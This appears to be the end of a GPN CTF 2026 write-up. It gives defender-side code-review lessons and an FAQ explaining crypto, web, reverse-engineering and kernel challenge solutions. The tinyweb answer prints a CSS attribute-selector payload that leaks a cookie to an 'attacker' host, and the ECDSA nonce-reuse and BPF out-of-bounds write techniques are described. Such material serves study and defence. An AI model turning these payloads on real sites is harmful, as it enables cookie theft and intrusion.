Every challenge in this writeup maps to a class of bug that exists in production code. The defender-side takeaways, organised by what to look for during code review:

**Crypto code.** Assert post-conditions on cryptographic primitives. `max(c) < q` for NTRU encryption. `r` non-repeating for ECDSA across signatures (or just use RFC 6979). Commitment schemes hash a *single* random plus the message, not two user-controlled values. Any nonce-derivation that round-trips through MD5 is broken — fastcoll collisions are seconds of compute. If your code calls `uuid3` and treats it as a hash, the prefix is attacker-controlled and collisions are free.

**Compiler trust.** `gcc -O3 -mavx2` miscompiling an inner-product loop is rare but possible, and the only way you catch it is by running the disassembly through a different implementation as ground truth. Any cryptographic-shaped code that uses SIMD intrinsics or auto-vectorization should have a scalar reference implementation it can be diff-tested against. The challenge built this for free — `mat_mul_naive` was the unaffected reference — but the same shape is what production crypto libraries do (libsodium, BoringSSL, etc.).

**Trust boundaries across compiled artefacts.** JVM AOT caches, Python `__pycache__`, Ruby YARV, Lua `luac`, and the entire ecosystem of "compile once, run many" artefacts inherit the integrity properties of the artefact, not the source. Verify the AOT cache against the JAR hash before trusting it. Pin `__pycache__` to the source `.py` hash. If you ship a closed-source binary that loads a precompiled cache, the cache is part of your TCB.

**Verifier trust.** An eBPF verifier is a compiler. Removing five string checks from the verifier source removes five classes of safety guarantee from the runtime. Treat your custom-kernel verifier changes with the same review rigor as the original. `git log` the BPF verifier for the lifetime of the patch series.

**Unsafe deserialization paths.** PHAR in PHP 7.4 still triggers deserialization on any `phar://` URL touch. `file_get_contents` + `md5_file` opening two TCP connections is a side-channel for swapping the bytes between integrity check and use. The deserialization-on-URL-touch behaviour has been the bedrock of PHP-side RCEs for a decade; the *integrity-check-vs-use* race is a separate primitive on top of it.

**CSS as side channel.** `Link: rel=stylesheet` injection is a fully general CSP bypass on any site that doesn't pin stylesheet sources. CSS attribute selectors `[attr^="x"]` paired with `background: url(…)` exfiltrate any attribute's prefix at network rate. The defender fix is `style-src 'self'` *and* a strict Link header parser.

**Forward-ref evaluation in schema generation.** Pydantic v2 evaluating string annotations as expressions during `model_json_schema()` is documented but not widely understood. Any code that calls `create_model` with user-supplied annotations should treat the annotation strings as *executable Python*. The fix is `from __future__ import annotations` plus `arbitrary_types_allowed = False` and never feeding the result through `model_json_schema` on user input.

**Setuid TOCTOU.** Two path-resolving syscalls on the same path, with no intervening synchronization, is a setuid bug. Rust's `fs::File::open` + fd-bound `metadata()` is the correct pattern; `fs::metadata(path) + fs::read_to_string(path)` is the bug.

## Frequently asked questions

### What does GPN CTF stand for?

GPN stands for *Gulaschprogrammiernacht*, a German hacker camp held annually at ZKM in Karlsruhe and organised by Entropia e.V. The CTF is run by **kitctf**, the CTF team of the Karlsruhe Institute of Technology. The 2026 edition is a 24-hour Jeopardy-style event with categories in reverse engineering, crypto, web, pwn, and misc.

### How many challenges did you solve at GPN CTF 2026?

19 flags across 6 reverse-engineering, 4 crypto, 3 web, 1 pwn, and 5 misc challenges. The full reproduction repository at [Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026) contains a standalone writeup with solver code for each.

### What was the hardest challenge?

`crypto/justfollowtherecipe`. It stacked two non-trivial bugs: a `gcc -O3 -mavx2` lane-1/2 swap in the `mat_mul` AVX2 inner product that corrupted the oracle output, and a textbook SIS / Kannan-embedding lattice attack on top. The compiler-bug diagnosis took the bulk of the time — once `A` was recovered correctly, BKZ-58 with fplll's `default.json` strategies finished in 45 seconds. The wrong-framing detour on `crypto/guess-the-taste` was longer in wall-clock (six hours) but only because I committed to the wrong challenge framing for hours before stepping back to re-read the protocol output.

### What's the trick on `crypto/guess-the-taste`?

The implementation forgets to reduce the NTRU ciphertext modulo `q`. Standard NTRU encryption is `c = (p · r · h + m) mod q`; the bug drops the `mod q`. Without it, `c` reaches values up to `~p · q = 1536` (visible in the protocol output) instead of being bounded by `q = 511`. The algebra reduces to `c mod p ≡ m`, so `plaintext = [c_i % 3 for c_i in c]` recovers the message in two lines. The intended attack — a 200-dimensional NTRU lattice reduction with BKZ-50, ~30 minutes — also recovers the same flag, confirming the bug is the specific unintended side channel and not a deeper protocol break.

### How does `crypto/easy-dsa` recover the private key?

The server's "secure" ECDSA nonce is `sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, message)) mod (n-1) + 1`. `uuid3` is **MD5** with a constant prefix. Marc Stevens' `fastcoll` generates two messages `m1, m2` that MD5-collide under the namespace prefix, producing the same nonce `k`. Standard ECDSA-nonce-reuse equations then recover `k = (z1 - z2) · (s1 - s2)^-1 mod n` and `d = (s1·k - z1) · r^-1 mod n`. A sign-flip check against the public key handles the symmetric `(-k, -d)` solution. Forge any fresh signature and claim the flag.

### What's the compiler bug in `crypto/justfollowtherecipe`?

`gcc -O3 -funroll-loops -mavx2` vectorises the 4-wide unrolled inner-product loop with `vpmuludq` and a `vpermd` broadcast/permute step that ends up loading `BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3]` into AVX2 lanes 0..3. The store back to memory writes those lanes in lane order, so `result[blk+1]` and `result[blk+2]` are interchanged for every full block of 4. The scalar tail loop is untouched. For `M = 64`, the bug swaps result indices `(1,2), (5,6), …, (57,58)` and leaves the last 4 alone. Undoing the per-batch swap in the solver restores `A` exactly.

### What's the win condition on `reverse/koenigsberg-delivery-problem`?

Hamiltonian path on a 250-node directed graph. The binary is a 4,500-line straight-line dispatch routine — 250 logically-identical state blocks, each ending in an indirect `jmp rdx` over a per-state jump table. The visit-counter is *per-state* (not per-edge), so the win condition is unambiguously vertex coverage, ruling out the Eulerian-path interpretation the *Königsberg* name nudges you toward. Average out-degree ≈ 100 per state, so Warnsdorff's heuristic on a 250-node digraph emits a path in ~70 ms with essentially zero backtracking.

### How does the CSS attribute-selector exfil on `web/tinyweb` work?

The site emits a `Link: rel=preload` HTTP header for an attacker-controlled URL; the Link header parser admits comma-separated entries, so adding `, rel=stylesheet` injects a second link the browser fetches as a stylesheet. External stylesheets are not CSP-blocked at this site. Attribute selectors like `body[data-cookie^="a"] { background: url(//attacker/?ch=a); }` fire a network request whenever the targeted attribute starts with the matched prefix. Iterate character-by-character to leak the cookie. The rate limit (30 s `await sleep` server-side) caps the leak speed at ~50 chars per session.

### Why is `reverse/stupidcontract` a kernel-forensics problem?

The handout is a 23 MB `vmlinux` built from a modified kernel that has had **five string checks** removed from the BPF verifier. The challenge is to figure out *which* checks. Bzipped kernels differ in 99% of bytes due to section-layout shifts, so naive `diff -q` is uninformative. The path that worked: unpack both kernels, run `nm -D` on both, diff the symbol tables for missing symbols, then grep the patched verifier source for what those symbols enforced. The missing checks turn out to be `BPF_ADJUST_END_FROM_*`, which previously prevented signed-offset arithmetic into a map; with them gone, a negative-index OOB write on the eBPF map clobbers an adjacent kernel-heap object's function pointer and `print_flag` is one call site away.

### Where can I find the solver code?

The full source repository is at [github.com/Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026). Each challenge directory contains a `README.md` with the solve writeup and a `solve.py` (or category-appropriate script) that reproduces the flag end-to-end. The meta writeups — the Binary Ninja workflow for Königsberg and the unintended-solution analysis for guess-the-taste — sit under `meta/` and each challenge's directory respectively.

### What's the broader lesson from GPN CTF 2026?

**Observation beats cleverness.** Three of the six prize-quality flags this engagement (`guess-the-taste`, `justfollowtherecipe`, `tinyweb`) turned on a detail that was visible in the artefact from minute one and missed for hours by teams that committed to the "expected" attack first. The defender takeaway is the same as the offender takeaway: assume your stack carries an unintended primitive somewhere, and the only way you find it is by reading what the stack *actually* outputs, not what the spec says it should.

## Closing notes and links

The full per-challenge writeups, with solver code, lattice constructions, fastcoll inputs, and BPF bytecode, live in the source repository:

- **Main repo:** [github.com/Abdelkad3r/gpn-ctf-2026](https://github.com/Abdelkad3r/gpn-ctf-2026)
- **Unintended solution writeup (guess-the-taste):** [meta/unintended-solution.md](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/meta/unintended-solution.md)
- **Binary Ninja workflow (Königsberg):** [reverse/koenigsberg-delivery-problem/BINJA.md](https://github.com/Abdelkad3r/gpn-ctf-2026/blob/master/reverse/koenigsberg-delivery-problem/BINJA.md)

If you're using this writeup as study material for your own CTF prep, the recommended reading order is: one challenge per category first (`reverse/stupidcontract`, `crypto/justfollowtherecipe`, `web/tinyweb`, `pwn/recipe-for-disaster`, `misc/organized`), then the paired challenges (`reverse/leftovers` + `reverse/leftover-leftovers` as a two-act lesson on AOT trust). That order takes you through five different vulnerability classes in five evenings of reading.

For more CTF coverage — including [SAS CTF 2026 Quals' Incident 67 BGP hijack writeup](/ctf-writeups/incident-67-bgp-hijack-crypto-wallet/), the [BhAcKAri CTF 2026 multi-category writeup](/ctf-writeups/bhackari-ctf-2026-writeup/), and the [HASBL CTF 2026 crypto track](/ctf-writeups/hasblctf-2026-crypto-writeup/) — see the full [CTF writeups index](/ctf-writeups/).

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What does GPN CTF stand for?","acceptedAnswer": {"@type": "Answer","text": "GPN stands for Gulaschprogrammiernacht, a German hacker camp held annually at ZKM in Karlsruhe and organised by Entropia e.V. The CTF is run by kitctf, the CTF team of the Karlsruhe Institute of Technology. The 2026 edition is a 24-hour Jeopardy-style event with categories in reverse engineering, crypto, web, pwn, and misc."}},
    {"@type": "Question","name": "How many challenges did you solve at GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "19 flags across 6 reverse-engineering, 4 crypto, 3 web, 1 pwn, and 5 misc challenges. The full reproduction repository at github.com/Abdelkad3r/gpn-ctf-2026 contains a standalone writeup with solver code for each."}},
    {"@type": "Question","name": "What was the hardest challenge at GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "crypto/justfollowtherecipe stacked two non-trivial bugs: a gcc -O3 -mavx2 lane-1/2 swap in the mat_mul AVX2 inner product that corrupted the oracle output, and a textbook SIS / Kannan-embedding lattice attack on top. The compiler-bug diagnosis took most of the time; once A was recovered correctly, BKZ-58 with fplll default strategies finished in 45 seconds."}},
    {"@type": "Question","name": "What is the trick on the guess-the-taste NTRU challenge?","acceptedAnswer": {"@type": "Answer","text": "The implementation forgets to reduce the NTRU ciphertext modulo q. Standard NTRU encryption is c = (p · r · h + m) mod q; the bug drops the mod q. Without it, c reaches values up to ~p · q = 1536 instead of being bounded by q = 511. The algebra reduces to c mod p ≡ m, so plaintext = [c_i % 3 for c_i in c] recovers the message in two lines of Python."}},
    {"@type": "Question","name": "How does easy-dsa recover the ECDSA private key?","acceptedAnswer": {"@type": "Answer","text": "The server's secure ECDSA nonce is sha256(uuid3(ns, sk_pem) ‖ uuid3(ns, message)). uuid3 is MD5 with a constant prefix. Marc Stevens' fastcoll generates two messages that MD5-collide under the namespace prefix, producing the same nonce k. Standard nonce-reuse equations recover k and d, with a sign-flip check against the public key to handle the symmetric solution."}},
    {"@type": "Question","name": "What is the gcc AVX2 lane swap in justfollowtherecipe?","acceptedAnswer": {"@type": "Answer","text": "gcc -O3 -funroll-loops -mavx2 vectorises a 4-wide inner-product loop with vpmuludq and a vpermd permute step that loads BB[blk+0], BB[blk+2], BB[blk+1], BB[blk+3] into AVX2 lanes 0..3. The store writes those lanes in order, so result[blk+1] and result[blk+2] are interchanged for every full block of 4. The scalar tail loop is untouched. For M = 64, swaps are (1,2), (5,6), …, (57,58); positions 60-63 are correct."}},
    {"@type": "Question","name": "What is the win condition on the Königsberg Delivery Problem?","acceptedAnswer": {"@type": "Answer","text": "Hamiltonian path on a 250-node directed graph. The binary is a 4,500-line straight-line dispatch routine — 250 state blocks each ending in an indirect jmp rdx over a per-state jump table. The visit-counter is per-state, not per-edge, so the win condition is vertex coverage. Average out-degree ≈ 100/state, so Warnsdorff's heuristic on a 250-node digraph emits a path in ~70 ms with essentially zero backtracking."}},
    {"@type": "Question","name": "How does the CSS attribute-selector exfiltration work in tinyweb?","acceptedAnswer": {"@type": "Answer","text": "The site emits a Link: rel=preload header for an attacker-controlled URL; the parser admits comma-separated entries, so adding , rel=stylesheet injects a second link the browser fetches as a stylesheet. Attribute selectors like body[data-cookie^=\"a\"] { background: url(//attacker/?ch=a); } fire a network request when the attribute starts with the matched prefix. Iterate character-by-character to leak the cookie."}},
    {"@type": "Question","name": "Why is stupidcontract a kernel-forensics problem?","acceptedAnswer": {"@type": "Answer","text": "The handout is a 23 MB vmlinux built from a modified kernel that has had five string checks removed from the BPF verifier — specifically the BPF_ADJUST_END_FROM_* set that prevents signed-offset arithmetic into a map. Bzipped kernels differ in 99% of bytes due to section-layout shifts, so naive diff is uninformative. The forensics path is nm -D both kernels, diff the symbol tables, grep the verifier source for what the missing symbols used to enforce. With those checks gone, a negative-index OOB write on the eBPF map clobbers an adjacent kernel-heap object's function pointer."}},
    {"@type": "Question","name": "Where is the solver code for GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "The full source repository is at github.com/Abdelkad3r/gpn-ctf-2026. Each challenge directory contains a README.md with the solve writeup and a solve.py (or category-appropriate script) that reproduces the flag end-to-end. Meta writeups — Binary Ninja workflow and unintended-solution analysis — are under meta/ and the respective challenge directories."}},
    {"@type": "Question","name": "What's the broader lesson from GPN CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "Observation beats cleverness. Three of the six prize-quality flags (guess-the-taste, justfollowtherecipe, tinyweb) turned on a detail visible in the artefact from minute one and missed for hours by teams committed to the expected attack first. The defender takeaway matches the offender takeaway: assume your stack carries an unintended primitive somewhere, and the only way you find it is by reading what the stack actually outputs, not what the spec says it should."}}
  ]
}
</script>
